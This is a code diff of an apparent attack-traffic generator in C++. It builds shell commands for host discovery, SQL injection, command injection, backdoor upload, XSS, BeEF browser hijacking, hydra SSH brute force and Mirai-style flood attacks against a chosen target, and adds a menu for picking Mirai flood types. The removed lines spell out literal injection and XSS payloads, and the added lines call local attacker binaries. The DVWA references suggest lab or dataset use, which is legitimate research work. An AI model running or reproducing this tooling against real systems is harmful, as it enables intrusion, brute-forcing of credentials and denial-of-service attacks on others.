@@ -48,12 +48,12 @@ std::string generate_command(AttackType type, std::string target, int duration) 
         case AttackType::RECON_HOST_DISCOVERY: return nmap_base + "-sn " + target;
 
         // Web-Based
-        case AttackType::WEB_SQL_INJECTION: return "curl -X POST -d \"id=1' OR '1'='1\" " + target + "/login.php"; // DVWA[56]
-        case AttackType::WEB_COMMAND_INJECTION: return "curl " + target + "/cmd.php?cmd=ls"; // DVWA[56]
-        case AttackType::WEB_BACKDOOR_MALWARE: return "curl -X POST -F \"file=@backdoor.php\" " + target + "/upload.php"; // DVWA[56]&Remot3d[57]
-        case AttackType::WEB_UPLOADING_ATTACK: return "curl -X POST -F \"file=@payload.jpg\" " + target + "/upload.php"; // DVWA[56]
-        case AttackType::WEB_XSS: return "curl -X POST -d \"comment=<script>alert('XSS')</script>\" " + target + "/comment.php"; // DVWA[56]
-        case AttackType::WEB_BROWSER_HIJACKING: return "./beef_attack " + target; // Beef[58]
+        case AttackType::WEB_SQL_INJECTION: return "timeout " + std::to_string(duration) + "s ./sqli_attacker";
+        case AttackType::WEB_COMMAND_INJECTION: return "timeout " + std::to_string(duration) + "s ./command_attack";
+        case AttackType::WEB_BACKDOOR_MALWARE: return "timeout " + std::to_string(duration) + "s ./backdoor_flood";
+        case AttackType::WEB_UPLOADING_ATTACK: return "timeout " + std::to_string(duration) + "s ./uploading_attack";
+        case AttackType::WEB_XSS: return "timeout " + std::to_string(duration) + "s ./xss_attacker";
+        case AttackType::WEB_BROWSER_HIJACKING: return "timeout " + std::to_string(duration) + "s ./beef_attack " ; // Beef[58]
         
         // Brute Force
         case AttackType::BRUTE_DICTIONARY: return hydra_base +" -l admin -P password.txt " + target + " ssh";
@@ -64,8 +64,10 @@ std::string generate_command(AttackType type, std::string target, int duration) 
 
 
 
-        // Mirai (Adapted)
-        case AttackType::MIRAI_GREIP_FLOOD: return "./mirai_flood greip " + target + " " + std::to_string(duration);
+        // Mirai (Adapted)  待开发ing
+        // case AttackType::MIRAI_GREIP_FLOOD: return "./mirai_flood greip " + target + " " + std::to_string(duration);
+        // case AttackType::MIRAI_GREETH_FLOOD: return "./mirai_flood greeth " + target + " " + std::to_string(duration);
+        // case AttackType::MIRAI_UDP_PLAIN: return "./mirai_flood udpplain " + target + " " + std::to_string(duration);
 
         default: return "";
     }
@@ -228,7 +230,12 @@ int main() {
         else if (type_choice == 2) selected = AttackType::SPOOF_DNS;
         else selected = AttackType::SPOOF_ARP;
     } else if (cat_choice == 7) { // Mirai
-        selected = AttackType::MIRAI_GREIP_FLOOD;
+        std::cout << "1. GREIP Flood\n2. GREETH Flood\n3. UDP Plain\nSelect Mirai Type: ";
+        std::cin >> type_choice;
+        if (type_choice == 1) selected = AttackType::MIRAI_GREIP_FLOOD;
+        else if (type_choice == 2) selected = AttackType::MIRAI_GREETH_FLOOD;
+        else if (type_choice == 3) selected = AttackType::MIRAI_UDP_PLAIN;
+        else selected = AttackType::MIRAI_GREIP_FLOOD;
     } else {
         selected = AttackType::DDOS_SYN_FLOOD;
     }
